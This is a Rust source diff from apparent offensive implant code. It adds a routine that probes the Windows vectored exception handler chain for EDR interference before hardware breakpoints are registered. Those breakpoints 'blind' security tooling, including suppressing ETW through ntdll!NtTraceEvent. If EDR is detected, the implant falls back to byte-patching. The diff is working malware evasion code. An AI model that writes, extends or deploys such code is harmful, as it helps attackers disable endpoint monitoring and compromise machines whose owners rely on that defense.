@@ -89,6 +89,13 @@ static mut HWBP_COUNT: usize = 0;
 static mut VEH_HANDLE: *mut core::ffi::c_void = core::ptr::null_mut();
 static mut SHADOW_BUF: *mut u8 = core::ptr::null_mut();
 
+/// true = VEH chain appears clean / safe to register our HWBP handler.
+/// Set false by veh_chain_has_handlers() if probe detects pre-existing
+/// handlers or EDR interference. Implant SHOULD check this before relying
+/// on HWBP-based blind patches.
+pub(crate) static VEH_SAFE: core::sync::atomic::AtomicBool =
+    core::sync::atomic::AtomicBool::new(true);
+
 /// Runtime switch for diag() file writes. Defaults OFF in production.
 /// Set to true via `set_diag_enabled(true)` during selftest only.
 pub(crate) static DIAG_ENABLED: core::sync::atomic::AtomicBool =
@@ -378,6 +385,83 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     EXCEPTION_CONTINUE_SEARCH
 }
 
+
+// ---- VEH CHAIN PROBE ------------------------------------------------------
+
+/// Dummy VEH handler — always continues search.
+/// Used by `veh_chain_has_handlers` as a transient probe.
+unsafe extern "system" fn probe_veh_handler(_ep: usize) -> i32 {
+    EXCEPTION_CONTINUE_SEARCH // 0 — keep walking the chain
+}
+
+/// Probe whether the VEH chain has pre-existing handlers or EDR interference.
+///
+/// Strategy:
+/// 1. Register a transient dummy handler via `AddVectoredExceptionHandler(1,…)`.
+/// 2. Immediately remove it via `RemoveVectoredExceptionHandler`.
+/// 3. If either call fails (null handle or zero return), the chain is likely
+///    compromised — an EDR may be hooking the VEH API or already occupying it.
+///
+/// Returns `true` if the chain appears compromised (unsafe to register).
+/// Returns `false` if the probe was clean (safe to register).
+///
+/// On failure, also sets `VEH_SAFE` to `false`.
+pub(crate) fn veh_chain_has_handlers() -> bool {
+    unsafe {
+        // Resolve AddVectoredExceptionHandler
+        let add_addr = match crate::resolve::export_addr(
+            b"kernelbase.dll",
+            b"AddVectoredExceptionHandler",
+        )
+        .or_else(|| {
+            crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
+        }) {
+            Some(a) => a,
+            None => {
+                VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+                return true;
+            }
+        };
+        type AddVEH = unsafe extern "system" fn(
+            usize,
+            unsafe extern "system" fn(usize) -> i32,
+        ) -> *mut core::ffi::c_void;
+        let add: AddVEH = core::mem::transmute(add_addr);
+
+        // Resolve RemoveVectoredExceptionHandler
+        let rm_addr = match crate::resolve::export_addr(
+            b"kernelbase.dll",
+            b"RemoveVectoredExceptionHandler",
+        )
+        .or_else(|| {
+            crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
+        }) {
+            Some(a) => a,
+            None => {
+                VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+                return true;
+            }
+        };
+        type RemoveVEH =
+            unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+        let rm: RemoveVEH = core::mem::transmute(rm_addr);
+
+        // Register probe at the front of the chain (First = 1).
+        let handle = add(1, probe_veh_handler);
+        if handle.is_null() {
+            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+            return true;
+        }
+
+        // Remove the probe immediately.
+        if rm(handle) == 0 {
+            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
+            return true;
+        }
+
+        false // chain appears clean
+    }
+}
 // ---- ADD / REMOVE --------------------------------------------------------
 
 /// Write a u64 to the Context buffer at the given offset (via raw pointer).
@@ -443,6 +527,19 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     };
     let ntsct: FnCtx = core::mem::transmute(ntsct_addr);
 
+
+    // Probe VEH chain before first registration. If an EDR already has handlers
+    // in the chain, our HWBP-based blind approach is compromised — bail out
+    // and set VEH_SAFE=false so the implant can fall back to byte-patch mode.
+    // Cache: once VEH_SAFE is false, skip re-probing.
+    if VEH_HANDLE.is_null() && !VEH_SAFE.load(core::sync::atomic::Ordering::Acquire) {
+        diag(b'v'); // VEH chain previously flagged unsafe
+        return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
+    }
+    if VEH_HANDLE.is_null() && veh_chain_has_handlers() {
+        diag(b'V'); // VEH chain compromised (fresh probe)
+        return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
+    }
     // Register VEH if not done (MUST be before setting breakpoints).
     if VEH_HANDLE.is_null() {
         diag(b'd'); // registering VEH
@@ -667,6 +764,13 @@ pub fn active_count() -> usize {
 
 pub fn is_ready() -> bool {
     unsafe { !SHADOW_BUF.is_null() }
+}
+
+/// Returns true if the VEH chain was found clean during probe.
+/// Implant SHOULD check this before relying on HWBP-based patches;
+/// if false, fall back to byte-patch mode.
+pub fn is_veh_safe() -> bool {
+    VEH_SAFE.load(core::sync::atomic::Ordering::Acquire)
 }
 
 /// Set HWBP on `ntdll!NtTraceEvent` → shadow returns 0 (ETW suppressed).
